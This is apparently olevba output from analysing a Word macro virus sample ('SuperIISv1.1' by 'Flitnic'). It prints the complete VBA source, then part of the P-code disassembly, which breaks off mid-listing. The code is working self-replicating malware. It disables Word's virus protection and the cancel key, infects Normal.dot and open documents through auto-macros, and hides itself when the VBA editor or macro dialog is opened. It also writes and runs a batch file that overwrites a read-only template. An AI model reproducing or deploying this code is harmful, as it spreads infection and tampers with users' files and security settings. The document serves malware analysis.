olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.c - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'On Error GoTo eb
'MyName=SuperIISv1.1
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr NormalTemplate.FullName, vbNormal
NoSet:
Call Flitnic
eb:
End Sub
Sub ViewVbCode()
On Error GoTo NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
'Clean Activedocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.1" Then
Acd = 1
Exit For
End If
Next t
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
NoDoc:
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 2 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.1" Then
NormT = 1
Exit For
End If
Next t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
Next i
esub:
eb:
Application.ShowVisualBasicEditor = True
NoDocL:
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
'Save ActiveDocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.1" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
FullCodeD = FullCodeD & l & Chr(13)
Next ii
End If
'Clean Activedocument:
a = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
'Save NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.1" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
FullCodeN = FullCodeN & l & Chr(13)
Next iiii
End If
'Clean NormalTemplate:
l = ""
On Error GoTo 0
On Error GoTo eb
a = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, a
NormalTemplate.Saved = True
esub:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
a = GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
If Application.ShowVisualBasicEditor = True Then ReInf = False
Reinfection:
If ReInf = True Then
'Reinfection:
Acd = 0
NormT = 0
If NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
End If
i = 1
If NormAt <> True Then NormalTemplate.Save
notemp:
If Acd <> 1 Then
Close
look2:
a = Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next i
End If
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub Flitnic()
Begin:
On Error GoTo eb
NormAt = False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On Error GoTo NoInf
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.1" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
Next ii
End If
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.1" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
Next iiii
End If
If NormT <> 1 Then
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt = ActiveDocument.ReadOnly
l = ""
On Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close
Close #1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
For i = 1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close #1
NormalTemplate.Saved = True
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
End If
notemp:
End If
i = 1
If Acd <> 1 Then
Close
look2:
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoInf:
eb:
a = Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved = False
GoTo NoNormal
End If
If NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr (NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End If
NormalTemplate.Saved = True
'First ever used this kind of Stealth. Infects Normal.Dot when
'it's ReadOnly too (immediatly, the first time you load an infected
'Document
'Written by Flitnic, member of [S o S] No Payload included yet!
NoNormal:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.IIS.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul1 - 18905 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0010 "On Error GoTo eb"
' Line #2:
' 	QuoteRem 0x0000 0x0013 "MyName=SuperIISv1.1"
' Line #3:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #4:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #5:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #6:
' 	Label NoSet 
' Line #7:
' 	ArgsCall (Call) Flitnic 0x0000 
' Line #8:
' 	Label eb 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Sub ViewVbCode())
' Line #11:
' 	OnError NoDoc 
' Line #12:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #13:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #14:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #15:
' 	Label NoSet 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #17:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #18:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #20:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #22:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Loop 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #26:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #29:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #30:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #31:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #32:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.1"
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #34:
' 	ExitFor 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #39:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #40:
' 	Label NoDoc 
' Line #41:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #42:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #43:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #44:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #45:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #46:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.1"
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #48:
' 	ExitFor 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #52:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #54:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Label esub 
' Line #58:
' 	Label eb 
' Line #59:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #60:
' 	Label NoDocL 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #62:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub ToolsMacro())
' Line #65:
' 	OnError NoDoc 
' Line #66:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #67:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #68:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #69:
' 	Label NoSet 
' Line #70:
' 	QuoteRem 0x0000 0x0014 "Save ActiveDocument:"
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #72:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #73:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #74:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #75:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.1"
' 	Eq 
' 	IfBlock 
' Line #76:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #77:
' 	ExitFor 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #81:
' 	LitStr 0x000C "Sub AutoOpen"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #82:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #83:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #84:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #85:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #86:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #87:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #88:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #91:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #92:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #93:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #94:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #95:
' 	Label NoDoc 
' Line #96:
' 	QuoteRem 0x0000 0x0014 "Save NormalTemplate:"
' Line #97:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #98:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #99:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #100:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #101:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.1"
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #103:
' 	ExitFor 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #108:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #109:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #110:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #111:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #112:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #113:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #114:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #117:
' 	LitStr 0x0000 ""
' 	St l 
' Line #118:
' 	OnError (GoTo 0) 
' Line #119:
' 	OnError eb 
' Line #120:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #121:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #122:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #123:
' 	Label esub 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #125:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #126:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #127:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #128:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #129:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #130:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Loop 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #134:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #135:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St a 
' Line #136:
' 	Ld a 
